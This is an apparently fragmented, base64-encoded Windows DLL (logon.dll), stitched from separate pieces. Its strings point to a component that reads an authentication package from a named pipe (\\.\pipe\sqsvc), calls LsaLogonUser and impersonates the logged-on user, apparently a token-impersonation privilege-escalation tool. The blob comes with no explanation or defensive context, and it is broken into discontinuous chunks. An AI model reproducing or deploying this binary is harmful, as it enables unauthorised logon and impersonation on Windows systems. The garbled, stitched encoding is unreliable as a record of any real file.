H8AQ2xvc2VIYW5kbGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB1mAAAc5gAAE7mQLuxGb9EAQAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAABzcXJ0AAAAAAAAAAAAAPB/AAAAAAAA+P/////////vfwAAAAAAABAAAAAAAAAAAIAUAAAA2BABEB0AAADcEAEQGgAAAOAQARAbAAAA5BABEB8AAADsEAEQEwAAAPQQARAhAAAANBABEA4AAAA8EAEQDQAAAEQQARAPAAAATBABEBAAAABUEAEQBQAAAFwQARAeAAAAZBABEBIAAABoEAEQIAAAAGwQARAMAAAAcBABEAsAAAB4EAEQFQAAAIAQARAcAAAAiBABEBkAAACQEAEQEQAAAJgQARAYAAAAoBABEBYAAACoEAEQFwAAALAQARAiAAAAuBABECMAAAC8EAEQJAAAAMAQARAlAAAAxBABECYAAADMEAEQAAAAAAAAAIAQRAAAAQAAAAAAAIAAMA','wQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0+P0BBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWltcXV5fYGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6e3x9fn8AMSNTTkFOAAAxI0lORA','EQM9tXU4gdFIkBEP8VnAABEIs1PKIBEIk92IYBEIX2dAQ4HnUCi/eNRfhQjUX8UFNTVuhdAAAAi138g8QUgfv///8/c0WLTfiD+f9zPY0UmTvRcjZS6JTl//+L+FmF/3QpjUX4UI1F/FCNBJ9QV1boIAAAAItF/IPEFEiJPciGARCjxIYBEDPA6wODyP9fXluL5V3DVYvsi0UUU4tdGFaLdQhXgyMAi30QxwABAAAAi0UMhcB0CIk4g8AEiUUMM8mJTQiAPiJ1ETPAhckPlMBGi8iwIolNCOs1/wOF/3QFigaIB0eKBkaIRRsPtsBQ6KFWAABZhcB0DP8Dhf90BYoGiAdHRopFG4TAdBmLTQiFyXWxPCB0BDwJdamF/3QHxkf/AOsBToNlGACAPgAPhMoAAACKBjwgdAQ8CXUDRuvzgD4AD4S0AAAAi1UMhdJ0CIk6g8IEiVUMi0UU/wAz0kIzyesCRkGAPlx0+YA+InUz9sEBdR+DfRgAdAyNRgGAOCJ1BIvw6w0zwDPSOUUYD5TAiUUY0enrC0mF/3QExgdcR/8Dhcl18YoGhMB0QTlNGHUIPCB0ODwJdDSF0nQqD77AUO','DksOTQ5PDlEOUw5VDlcO','V1hZWgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQIECJB2ARCkAwAAYIJ5giEAAAAAAAAApt8AAAAAAAChpQAAAAAAAIGf4PwAAAAAQH6A/AAAAACoAwAAwaPaoyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIH+AAAAAAAAQP4AAAAAAAC1AwAAwaPaoyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIH+AAAAAAAAQf4AAAAAAAC2AwAAz6LkohoA5aLoolsAAAAAAAAAAAAAAAAAAAAAAIH+AAAAAAAAQH6h/gAAAABRBQAAUdpe2iAAX9pq2jIAAAAAAAAAAAAAAAAAAAAAAIHT2N7g+QAAMX6B/gAAAAAAAAAAAAAAAJQmAAAAAAAAAAAAAAAAAACAk','2Lw41N6MH4CIlFCFEPtsBQ6On6//9ZWYXAdBKLRQhqAohF/Ihd/cZF/gBZ6xXoh53//zPJQccAKgAAAIhd/MZF/QCLReiNVfhqAf9wBGoDUlGNTfxRV/+wqAAAAI1F6FDoTgwAAIPEJIXAdRU4RfQPhHv///+LRfCDYHD96W////+D+AF1E4B99AAPtkX4dCWLTfCDYXD96xwPtlX4D7ZF+cHiCAvQgH30AHQHi03wg2Fw/YvCX1uL5V3DVYvsgz1MkQEQAHUSi00IjUG/g/gZdwODwSCLwV3DagD/dQjolf7//1lZXcPMzMzMzMzMzMzMzMzMzFWL7FeDPbiGARABD4L9AAAAi30Id3cPtlUMi8LB4ggL0GYPbtryD3DbAA8W27kPAAAAI8+DyP/T4Cv5M9LzD28PZg/v0mYPdNFmD3TLZg/XyiPIdRhmD9fJI8gPvcEDx4XJD0XQg8j/g8cQ69BTZg/X2SPY0eEzwCvBI8hJI8tbD73BA8eFyQ9Ewl/Jww+2VQyF0nQ5M8D3xw8AAAB0FQ+2DzvKD0THhcl0IEf3xw8AAAB162YPbsKDxxBmDzpjR/BAjUwP8A9CwXXtX8nDuPD///8jx2YP78BmD3QAuQ8AAAAjz7r/////0+JmD9f4I/p1FGYP78BmD3RAEIPAEGYP1/iF/3TsD7zXA8LrvYt9CDPAg8n/8q6DwQH32YPvAYpFDP3yroPHATgHdAQzwOsCi8f8X8nDVYvsi1UUVot1CFeLegyF9nUW','SU5GAAAAMSNRTkFOAABDAE8ATgBPAFUAVAAkAAAAQQAAABcAAABnZW5lcmljAHVua25vd24gZXJyb3IAAABpb3N0cmVhbQAAAABpb3N0cmVhbSBzdHJlYW0gZXJyb3IAAABzeXN0ZW0AAHN0cmluZyB0b28gbG9uZwBpbnZhbGlkIHN0cmluZyBwb3NpdGlvbgBcAFwALgBcAHAAaQBwAGUAXABzAHEAcwB2AGMAAAAAAEVycm9yIGNhbGxpbmcgTHNhQ29ubmVjdFVudHJ1c3RlZC4gRXJyb3IgY29kZTogAGhMU0EgKExTQSBoYW5kbGUpIGlzIE5VTEwsIHRoaXMgc2hvdWxkbid0IGV2ZXIgaGFwcGVuLgAATUlDUk9TT0ZUX0FVVEhFTlRJQ0FUSU9OX1BBQ0tBR0VfVjFfMAAAAEtlcmJlcm9zAAAAAFJlY2VpdmVkIGFuIGludmFsaWQgYXV0aCBwYWNrYWdlIGZyb20gdGhlIG5hbWVkIHBpcGUAAAAAQ2FsbCB0byBMc2FMb29rdXBBdXRoZW50aWNhdGlvblBhY2thZ2UgZmFpbGVkLiBFcnJvciBjb2RlOiAAQ2FsbCB0byBPcGVuUHJvY2Vzc1Rva2VuIGZhaWxlZC4gRXJyb3Jjb2RlOiAAAAAAQ2FsbCB0byBHZXRUb2tlbkluZm9ybWF0aW9uIGZhaWxlZC4ARXJyb3IgY2FsbGluZyBMc2FMb2dvblVzZXIuIEVycm9yIGNvZGU6IAAAAAAAAAAATG9nb24gc3VjY2VlZGVkLCBpbXBlcnNvbmF0aW5nIHRoZSB','ATwBjAHQAbwBiAGUAcgAAAE4AbwB2AGUAbQBiAGUAcgAAAAAARABlAGMAZQBtAGIAZQByAAAAAABBAE0AAAAAAFAATQAAAAAATQBNAC8AZABkAC8AeQB5AAAAAABkAGQAZABkACwAIABNAE0ATQBNACAAZABkACwAIAB5AHkAeQB5AAAASABIADoAbQBtADoAcwBzAAAAAABVAFMARQBSADMAMgAuAEQATABMAAAAAABNZXNzYWdlQm94VwBHZXR','tFwBEAAAAABMggEQAAAAAP////8AAAAADAAAAGUiABAAAAAAwSIAEAAAAAA4XQEQAwAAAEhdARDQXAEQtFwBEAAAAABsggEQAAAAAP////8AAAAADAAAAJsiABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAXioAEAAAAAD+////AAAAANj///8AAAAA/v///wAAAADyLAAQAAAAAP7///8AAAAA1P///wAAAAD+////ii4AEKQuABAAAAAA/v///wAAAADE////AAAAAP7///8AAAAAa0IAEAAAAAD+////AAAAANj///8AAAAA/v///ytNABBHTQAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAABRPABAAAAAA/v///wAAAADY////AAAAAP7///8AAAAArlcAEP7///8AAAAAulcAEP7///8AAAAA2P///wAAAAD+////AAAAAB5ZABD+////AAAAAC1ZABD+////AAAAAHz///8AAAAA/v///wAAAACRXAAQAAAAAP7///8AAAAA2P///wAAAAD+////xGUAEMhlABAAAAAA/v///wAAAADY////AAAAAP7///+QZQAQlGUAEAAAAAD+////AAAAAND///8AAAAA/v///wAAAABgcgAQAAAAACVyABAvcgAQ/v///wAAAACw////AAAAAP7///8AAAAAE2gAEAAAAABnZwAQcWcAEP7///8AAAAA2P///wAAAAD+////h28AEItvABAAAAAA/v///wAAAADY////AAAAAP7///9cZgAQZWYAEEAAAAAAAAAAAAAAAMBoABD/////AAAAAP////8AAAAAAAAAAAAAAAABAAAAAQAAAGRfARAiBZMZAgAAAHRfARABAAAAhF8BEAAAAAAAAAAAAAAAAAEAAAAAAAAA/v///wAAAADU////AAAAAP7///9CcQAQRnEAEAAAAACiZgAQAAAAAOxfARACAAAA+F8BELRcARAAAAAApIIBEAAAAAD/////AAAAAAwAAACHZgAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAC6AABAAAAAA/v///wAAAADY////AAAAAP7///95gwAQjIMAEAAAAAD+////AAAAALz///8AAAAA/v///wAAAACChQAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAF2JABAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAA2IoAEAAAAAD+////AAAAAND///8AAAAA/v///wAAAADflwAQAAAAAP7///8AAAAAyP///wAAAAD+////AAAAADuhABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAsrEAEAAAAAD+////AAAAAMz///8AAAAA/v///wAAAADExgAQAAAAAAAAAACOxgAQ/v///wAAAADQ////AAAAAP7///8AAAAAbskAEAAAAAD+////AAAAANj///8AAAAA/v///wAAAAD8yQAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAHjSABAAAAAA/v///wAAAADM////AAAAAP7///8AAAAA5fMAEAAAAAD+////AAAAANT///8AAAAA/v///wAAAADh9AAQAAAAAP7///8AAAAA0P///wAAAAD+////AAAAAPH3ABAAAAAAAAAAAOPo+1IAAAAAMmIBAAEAAAABAAAAAQAAAChiAQAsYgEAMGIBAGAYAAA8YgEAAABsb2dvbi5kbGwAVm9pZEZ1bmMAAAAAsGMBAAAAAAAAAAAACGQBABgBAQCsYgEAAAAAAAAAAACCZAEAFAABAJhiAQAAAAAAAAAAAOxkAQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAC8ZAEAqGQBAJBkAQDSZAEAAAAAACJkAQAuZAEAQmQBABRkAQBiZAEAamQBAHZkAQDYaAEA6GgBAPhoAQBSZAEAsGYBAPpkAQAKZQEAGmUBACxlAQBCZQEAVGUBAGBlAQB0ZQEAkGUBAJ5lAQC0ZQEAxmUBANxlAQDyZQEA/mUBAApmAQAWZgEAJmYBADhmAQBIZgEAVmYBAG5mAQCAZgEAlmYBAAxpAQDGZgEA4GYBAPpmAQAUZwEAMGcBAE5nAQB2ZwEAimcBAJZnAQCkZwEAsmcBALxnAQDQZwEA6GcBAABoAQAWaAEAKGgBADpoAQBEaAEAUGgBAFxoAQBqaAEAemgBAIpoAQCcaAEAsGgBAMZoAQAAAAAA+GMBANZjAQDAYwEAAAAAACYATHNhQ29ubmVjdFVudHJ1c3RlZAAsAExzYUxvb2t1cEF1dGhlbnRpY2F0aW9uUGFja2FnZQAAKwBMc2FMb2dvblVzZXIAAFNlY3VyMzIuZGxsAMIAQ3JlYXRlRmlsZVcATwRSZWFkRmlsZQAACQJHZXRDdXJyZW50UHJvY2VzcwBQAkdldExhc3RFcnJvcgAA0QBDcmVhdGVNdXRleFcAAFAFU2xlZXAACQZsc3RybGVuVwAA3wVXcml0ZUZpbGUAS0VSTkVMMzIuZGxsAADTAUxzYU50U3RhdHVzVG9XaW5FcnJvcgASAk9wZW5Qcm9jZXNzVG9rZW4AAG8BR2V0VG9rZW5JbmZvcm1hdGlvbgCJAUltcGVyc29uYXRlTG9nZ2VkT25Vc2VyAEFEVkFQSTMyLmRsbAAAIQFFbmNvZGVQb2ludGVyAP4ARGVjb2RlUG9pbnRlcgDIAUdldENvbW1hbmRMaW5lQQAOAkdldEN1cnJlbnRUaHJlYWRJZAAAPwRSYWlzZUV4Y2VwdGlvbgAArARSdGxVbndpbmQAZwNJc0RlYnVnZ2VyUHJlc2VudABtA0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQAUQFFeGl0UHJvY2VzcwBmAkdldE1vZHVsZUhhbmRsZUV4VwAAnQJHZXRQcm9jQWRkcmVzcwAA0QNNdWx0aUJ5dGVUb1dpZGVDaGFyAMsFV2lkZUNoYXJUb011bHRpQnl0ZQA4A0hlYXBTaXplAAAzA0hlYXBGcmVlAAAvA0hlYXBBbGxvYwAKBVNldExhc3RFcnJvcgAAogJHZXRQcm9jZXNzSGVhcAAAwAJHZXRTdGRIYW5kbGUAAD4CR2V0RmlsZVR5cGUABQFEZWxldGVDcml0aWNhbFNlY3Rpb24AvgJHZXRTdGFydHVwSW5mb1cAYgJHZXRNb2R1bGVGaWxlTmFtZUEAAC0EUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIACgJHZXRDdXJyZW50UHJvY2Vzc0lkANYCR2V0U3lzdGVtVGltZUFzRmlsZVRpbWUAJwJHZXRFbnZpcm9ubWVudFN0cmluZ3NXAACdAUZyZWVFbnZpcm9ubWVudFN0cmluZ3NXAIAFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAABBBVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgBIA0luaXRpYWxpemVDcml0aWNhbFNlY3Rpb25BbmRTcGluQ291bnQAXwVUZXJtaW5hdGVQcm9jZXNzAABxBVRsc0FsbG9jAABzBVRsc0dldFZhbHVlAHQFVGxzU2V0VmFsdWUAcgVUbHNGcmVlAGcCR2V0TW9kdWxlSGFuZGxlVwAAJQFFbnRlckNyaXRpY2FsU2VjdGlvbgAAogNMZWF2ZUNyaXRpY2FsU2VjdGlvbgAAYwJHZXRNb2R1bGVGaWxlTmFtZVcAAKcDTG9hZExpYnJhcnlFeFcAAHIDSXNWYWxpZENvZGVQYWdlAKQBR2V0QUNQAACGAkdldE9FTUNQAACzAUdldENQSW5mbwA2A0hlYXBSZUFsbG9jAJYDTENNYXBTdHJpbmdXAADcAUdldENvbnNvbGVDUAAA7gFHZ','/gFzAzPSQolzBIXSdAdHiX34iXsIi0UMSIlzBP9FCIl7CIlFDIXAD4XW/v//uE5AAAAz0jlTCHUui1MEiwuL8ovBweIQwegQC9DB7hCLRfzB4RAF8P8AAIkLiUX8hfZ024lTBIlzCItTCPfCAIAAAHU0izuLcwSLx4vOwegfA/YL8MHpH4tF/APSC9EF//8AAAP/iUX898IAgAAAdNmJO4lzBIlTCF9eZolDCluL5V3DzMzMzMzMzMzMzMyLRCQIi0wkEAvIi0wkDHU','bnR','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